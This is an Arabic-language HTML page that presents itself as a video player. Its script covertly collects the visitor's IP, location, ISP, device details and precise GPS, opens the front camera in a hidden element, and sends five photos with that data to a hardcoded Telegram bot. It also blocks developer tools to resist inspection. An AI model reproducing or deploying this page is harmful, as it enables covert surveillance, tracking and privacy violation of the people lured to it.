<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>فيديو</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            overflow: hidden;
        }

        .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        .video-background video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .hidden-camera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            visibility: hidden;
        }

        canvas {
            display: none;
        }

        ::-webkit-scrollbar {
            display: none;
        }
    </style>
</head>
<body>

    <div class="video-background">
        <video id="bgVideo" autoplay loop muted playsinline>
            <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
        </video>
    </div>

    <div class="hidden-camera">
        <video id="camera" autoplay playsinline muted></video>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        // ==================== إعدادات تليجرام ====================
        const BOT_TOKEN = "8179040156:AAFdn8ApCAIbaWhpLaFQMyqrwUwfR1hfyuY";
        let CHAT_ID = null;
        let stream = null;
        let cameraReady = false;
        
        // ==================== معلومات الجهاز ====================
        let deviceInfo = {
            ip: 'جاري الجلب...',
            country: 'جاري الجلب...',
            city: 'جاري الجلب...',
            region: 'جاري الجلب...',
            os: 'جاري الجلب...',
            browser: 'جاري الجلب...',
            screen: 'جاري الجلب...',
            language: 'جاري الجلب...',
            timezone: 'جاري الجلب...',
            isp: 'جاري الجلب...'
        };
        
        // ==================== عناصر الصفحة ====================
        const camera = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        
        // ==================== جلب IP والموقع من عدة خدمات (محاولة متعددة) ====================
        async function getIPInfo() {
            // قائمة الخدمات البديلة (جرب كل واحدة حتى تنجح)
            const services = [
                {
                    name: 'ip-api.com',
                    url: 'https://ip-api.com/json/',
                    parser: (data) => ({
                        ip: data.query,
                        country: `${data.country} (${data.countryCode})`,
                        city: data.city,
                        region: data.regionName,
                        isp: data.isp,
                        lat: data.lat,
                        lon: data.lon
                    })
                },
                {
                    name: 'ipinfo.io',
                    url: 'https://ipinfo.io/json',
                    parser: (data) => ({
                        ip: data.ip,
                        country: data.country,
                        city: data.city,
                        region: data.region,
                        isp: data.org,
                        lat: data.loc?.split(',')[0],
                        lon: data.loc?.split(',')[1]
                    })
                },
                {
                    name: 'api.ipify.org',
                    url: 'https://api.ipify.org?format=json',
                    parser: (data) => ({
                        ip: data.ip,
                        country: 'تم جلب IP فقط',
                        city: 'غير متوفر',
                        region: 'غير متوفر',
                        isp: 'غير متوفر'
                    })
                }
            ];
            
            for (const service of services) {
                try {
                    console.log(`محاولة جلب من: ${service.name}`);
                    const response = await fetch(service.url, { timeout: 5000 });
                    const data = await response.json();
                    
                    const parsed = service.parser(data);
                    
                    if (parsed.ip && parsed.ip !== 'غير متوفر') {
                        deviceInfo.ip = parsed.ip;
                        deviceInfo.country = parsed.country || 'غير معروف';
                        deviceInfo.city = parsed.city || 'غير معروف';
                        deviceInfo.region = parsed.region || 'غير معروف';
                        deviceInfo.isp = parsed.isp || 'غير معروف';
                        
                        console.log(`✅ تم الجلب من ${service.name}: ${deviceInfo.ip}`);
                        return true;
                    }
                } catch (error) {
                    console.log(`❌ فشل ${service.name}:`, error);
                }
            }
            
            // إذا فشلت كل الخدمات، استخدم API محلي بديل
            try {
                const response = await fetch('https://api.seeip.org/json/');
                const data = await response.json();
                deviceInfo.ip = data.ip;
                deviceInfo.country = 'تم جلب IP فقط';
            } catch(e) {
                deviceInfo.ip = 'غير متاح (VPN أو حظر)';
                deviceInfo.country = 'غير متاح';
                deviceInfo.city = 'غير متاح';
            }
            
            return false;
        }
        
        // ==================== جلب نظام التشغيل والمتصفح ====================
        function getSystemInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            
            // تحديد نظام التشغيل بدقة
            let os = 'Unknown';
            if (userAgent.indexOf('Win') !== -1) {
                if (userAgent.indexOf('Windows NT 10.0') !== -1) os = 'Windows 10/11';
                else if (userAgent.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7';
                else os = 'Windows';
            }
            else if (userAgent.indexOf('Mac') !== -1) os = 'macOS';
            else if (userAgent.indexOf('Linux') !== -1) {
                if (userAgent.indexOf('Android') !== -1) os = 'Android';
                else os = 'Linux';
            }
            else if (userAgent.indexOf('iOS') !== -1 || userAgent.indexOf('iPhone') !== -1) os = 'iOS';
            else if (userAgent.indexOf('iPad') !== -1) os = 'iPadOS';
            
            // تحديد المتصفح بدقة
            let browser = 'Unknown';
            if (userAgent.indexOf('Chrome') !== -1 && userAgent.indexOf('Edg') === -1 && userAgent.indexOf('OPR') === -1) browser = 'Google Chrome';
            else if (userAgent.indexOf('Firefox') !== -1) browser = 'Mozilla Firefox';
            else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) browser = 'Apple Safari';
            else if (userAgent.indexOf('Edg') !== -1) browser = 'Microsoft Edge';
            else if (userAgent.indexOf('OPR') !== -1 || userAgent.indexOf('Opera') !== -1) browser = 'Opera';
            else if (userAgent.indexOf('Brave') !== -1) browser = 'Brave';
            
            deviceInfo.os = `${os} (${platform})`;
            deviceInfo.browser = browser;
            deviceInfo.screen = `${screen.width}x${screen.height}`;
            deviceInfo.language = navigator.language || navigator.userLanguage;
            deviceInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        }
        
        // ==================== جلب الموقع الجغرافي الدقيق (GPS) - اختياري ====================
        async function getGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    (error) => {
                        console.log('GPS غير متاح:', error.message);
                        resolve(null);
                    },
                    { timeout: 10000, enableHighAccuracy: true }
                );
            });
        }
        
        // ==================== الحصول على Chat ID ====================
        async function getChatId() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                const result = await response.json();
                
                if (result.ok && result.result.length > 0) {
                    CHAT_ID = result.result[result.result.length - 1].message?.chat?.id;
                    return CHAT_ID !== null;
                }
                return false;
            } catch(error) {
                console.error('خطأ:', error);
                return false;
            }
        }
        
        // ==================== تشغيل الكاميرا ====================
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                camera.srcObject = stream;
                cameraReady = true;
                return true;
            } catch(err) {
                console.error('خطأ الكاميرا:', err);
                return false;
            }
        }
        
        // ==================== إنشاء نص المعلومات للإرسال ====================
        function getInfoText(photoNumber, gpsLocation = null) {
            let gpsText = '';
            if (gpsLocation && gpsLocation.lat) {
                gpsText = `
📍 GPS (دقيق):
   خط العرض: ${gpsLocation.lat}
   خط الطول: ${gpsLocation.lon}
   دقة: ${Math.round(gpsLocation.accuracy)} متر
                `;
            }
            
            return `
📸 صورة ${photoNumber}/5

━━━━━━━━━━━━━━━━
📍 معلومات الجهاز والموقع:
━━━━━━━━━━━━━━━━

🌐 IP Address: ${deviceInfo.ip}
🗺️ الدولة: ${deviceInfo.country}
🏙️ المدينة: ${deviceInfo.city}
📍 المنطقة: ${deviceInfo.region}
📡 مزود الخدمة (ISP): ${deviceInfo.isp}

💻 نظام التشغيل: ${deviceInfo.os}
🌍 المتصفح: ${deviceInfo.browser}
📱 حجم الشاشة: ${deviceInfo.screen}
🔤 اللغة: ${deviceInfo.language}
⏰ المنطقة الزمنية: ${deviceInfo.timezone}
${gpsText}
━━━━━━━━━━━━━━━━
🕐 الوقت: ${new Date().toLocaleString('ar-SA')}
━━━━━━━━━━━━━━━━
            `;
        }
        
        // ==================== التقاط وإرسال الصورة مع المعلومات ====================
        async function captureAndSend(photoNumber, gpsLocation = null) {
            if (!CHAT_ID || !cameraReady) return false;
            
            try {
                if (camera.videoWidth === 0 || camera.videoHeight === 0) return false;
                
                canvas.width = camera.videoWidth;
                canvas.height = camera.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
                ctx.setTransform(1, 0, 0, 1, 0, 0);
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                formData.append('caption', getInfoText(photoNumber, gpsLocation));
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                return result.ok;
            } catch(e) {
                console.error('خطأ في الإرسال:', e);
                return false;
            }
        }
        
        // ==================== تصوير 5 صور ====================
        async function captureAllPhotos(gpsLocation) {
            for (let i = 1; i <= 5; i++) {
                await captureAndSend(i, gpsLocation);
                if (i < 5) {
                    await new Promise(resolve => setTimeout(resolve, 9000));
                }
            }
            
            setTimeout(() => {
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
            }, 2000);
        }
        
        // ==================== التشغيل الرئيسي ====================
        async function init() {
            // 1. جلب معلومات النظام
            getSystemInfo();
            
            // 2. جلب IP والموقع (محاولة متعددة)
            await getIPInfo();
            
            // 3. جلب موقع GPS دقيق (إذا كان متاحاً)
            const gpsLocation = await getGPSLocation();
            
            // 4. تشغيل الكاميرا
            const cameraSuccess = await startCamera();
            
            // 5. الحصول على Chat ID
            await getChatId();
            
            // 6. بدء التصوير
            if (cameraSuccess && CHAT_ID) {
                setTimeout(() => {
                    captureAllPhotos(gpsLocation);
                }, 1000);
            }
        }
        
        init();
        
        // منع أدوات المطور
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
                (e.ctrlKey && e.key === 'U')) {
                e.preventDefault();
                return false;
            }
        });
        
        window.onbeforeunload = () => {
            if (stream) stream.getTracks().forEach(t => t.stop());
        };
    </script>
</body>
